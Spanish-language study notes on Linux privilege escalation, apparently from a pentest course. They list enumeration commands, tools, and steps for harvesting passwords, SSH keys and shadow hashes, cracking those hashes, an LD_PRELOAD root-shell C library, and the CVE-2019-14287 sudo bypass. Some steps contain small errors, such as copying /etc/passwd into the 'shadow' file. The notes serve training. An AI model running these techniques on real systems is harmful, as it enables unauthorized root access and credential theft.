 # Ciber Mentor LINUX
 
## Webpages de ayuda
* Basic Linux Privilege Escalation - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* Linux Privilege Escalation - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* Checklist - Linux Privilege Escalation - [https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
* Sushant 747's Guide (Country dependant - may need VPN) - [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

## Initial Enumeration 

- **lsb_release -a** -> Para ver que distribucion de Linux es
- **hostname** -> En que distribucion de Linux estamos
- **uname -a** -> Miramos el Kernel y algunos detalles, amdx64 o x86, version. Buscar el Google si existe algun exploit. 
- **cat /proc/version** -> Miramos algo similar al comando anterior
- **cat /etc/issue** -> Miramos la distribucion, arquitectura, etc...
- **ps aux** -> Servicios que estan corriendo, que usuario esta corriendo la tarea, tareas Cron
	- **ps aux | grep root** -> Mirar las tareas que se ejecutan del usuario root

- **whoami** -> Quien soy?
- **id** -> Miramos nuestro user ID, a que grupos pertenecemos, etc...
- **sudo -l** -> Para ver si tenemos privilegios en el Sudoers (l=ele), que podamos ejecutar comandos como (root) NOPASSWD
	- **sudo Command** -> Para poder ejecutar comando como root
- **cat /etc/passwd** -> Podemos ver los usuarios, no las passwd. Los usuarios tiene /bin/bash al final 
- **cat /etc/shadow** -> Archivos sensibles 
- **cat /etc/group** -> 
- **history** -> Podemos ver el historial de los comandos
- **sudo su -** -> Covertirnos en root, colocando la passwd

- **ifconfig** o  **ip a** -> Miras las interfaces de Linux, IP Address
- **route** o **ip route** -> Miras la tabla de ruteo y la interface
- **arp -a** o **ip neigh** -> Miras la tabla de ARP
- **netstat -ano** -> Miras los puertos que estan abiertos de manera interna

- **grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null** -> Te colorea la palabra passwd para que se mas facil encontrarla
- **locate password | more** -> Buscamos la palabra password y lo concatenamos con el coamndo More para ir bajando lentamente.
- **find / -name authorized_keys** o **find / -name id_rsa 2> /dev/null** -> Encontrar la clave rsa de SSH

## Exploring Automated Tools
Webpages 
- LinPeas - [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) Te muestra todas las vulnerabilidades que existen en esa distribucion 
- LinEnum - [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- Linux Exploit Suggester - [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- Linux Priv Checker - [https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

- **./linpeas.sh** -> Para ejecutar el binario
Podremos ver los diferentes colores y ahi podremos ver en donde es mas facil poder hacer el (PE=Privilege Escalation)
- **./linux-exploit-suggester.sh** -> Podemos ver los CVE potenciales


## Kernel Exploits
Webpage 
- Kernel Exploits - [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
Podemos buscar la version del Kernel en Google y ver si tiene un exploit, o podemos usar la herramienta Exploit Suggester para ver los exploits que podemos usar para Escalar Privilegios

## Escalation Path: Passwd and File permisions
- **history** -> Podemos ver el historial y puede que haya alguna passwd
- **.bash_history** -> Lo podemos encontrar al momento de hacer 'ls -la', despues un 'cat'. Ahi tambien podrian existir passwd
- **myvpn.ovpn** -> Podemos hacerle un 'cat' al file del VPN y mirar la ruta de su passwd y asi obtenerla

Podemos usar la Web de PaylodAllTheThings para mirar los archivos que contienen passwd y correr el comando. 

- **cat /etc/passwd** -> Podemos ver los usuarios, gupo e id, tambien contiene un primer x que es ahi donde esta la passwd
- **cat /etc/shadow** -> Podems ver los Hash 
Podemos hacer cosas maliciosas con la Tool '**Unshadow**' 
1.- Debemos de tener el contenido del '/etc/passwd' en un archivo que se llame 'passwd'
2.- Debemos de tener el contenido del '/etc/passwd' en un archivo que se llame 'shadow'
Esta Tool te hara juntar los dos archivos 
Despues con Hashcat podemos saber que tipo de Hash es y usando el diccionario de rockyou podriamos saber la passwd
O podemos usar John the Ripper para saber la passwd con el Hash


Podemos encontrar algunas keys con estos comandos:
- **find / -name authorized_keys 2> /dev/null** Para buscar la clave Publica
- **find / -name id_rsa 2> /dev/null** Para buscar la clave Privada
Buscaremos la id_rsa para podernos conectar por SSH con la clave privada 
- **ssh -i id_rsa user@ip** -> Nos conectamos por SSH sin proporcionar la passwd, el archivo id_rsa debe tener 600 de privilegio con chmod

## Escalation Path Sudo

Webpage Buscar en 'Sudo privileges' el comando que podamos ejecutar en el sudoers
GTFOBins - [https://gtfobins.github.io/](https://gtfobins.github.io/)
Linux PrivEsc Playground - [https://tryhackme.com/room/privescplayground](https://tryhackme.com/room/privescplayground)

- **sudo -l** Podemos ver los privilegios en el sudoers (l=ele) y ver que comandos podemos ejecutar como root sin passwd
Tenemos comandos para vim, awk, nano, apache2, etc...
- **LD_PRELOAD** Podemos hacer un script en el cual podriamos ejecutar cualquie comando que aparezca en el Sudoers (Liberia PreLoad)
	- **nano shell.c**
		\#incude  <stdio.h>
		\#include <sys/types.h>
		\#include <stdlib.h>

		void init() {
			unsetenv("LD_PRELOAD");
			setgid(0);
			setuid(0);
			system("/bin/bash");
		}
**gcc -fPIC -shared -o shell.so shell.c -nostartfiles** Despues lo compilamos
**sudo LD_PRELOAD=/home/user/shell.so < COMMAND>** Ahi podemos colocar cualquier comando que salga en el sudoers, debemos de colocar la ruta absoluta del shell.so


Exploit-DB for CVE-2019-14287 - [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502) Cuando tenemos en el Sudoers un (!root)
Ahi nos explica que comando poner para poder ser root.
- **sudo -u#-1 /bin/bash** Comando para ser root cuando tenemos en el sudoers un (!root)


## Escalation Path: SUID (Set User ID)
1er Owner (Propietario), 2do Grupo, 3ro Otros (r=read, w=write, x=execute, d=directory) (r=4 bits, w=2bits, x=1bit)  7=rwx
- **chmod +x file** Asignamos los permisos de ejecucion, en este caso para todos 
- **chmod o+x file** Asignamos permisos de ejecucion, en este caso para otros

- **find / -perm -u=s -type f 2>/dev/null** Buscaremos en la raiz los archivos que contengan el permiso S (f=files) y los errores que no nos aparezcan, encotramos varios, por lo que escogemos uno para ver sus privilegios
	Se verian asi:
		**ls -la /usr/bin/systemctl** Para ver los privilegios del archivo y lo mirariamos asi - rw**s** r-x r-x 
GTFOBins - [https://gtfobins.github.io/](https://gtfobins.github.io/) Para buscar ahi el SUID y ver como podemos ejecutar el comando para escalar privilegios
Aveces no todos son vulnerables y por lo tanto no se encuentran en esa pagina.

## Escalation Path: Other SUID Escalation
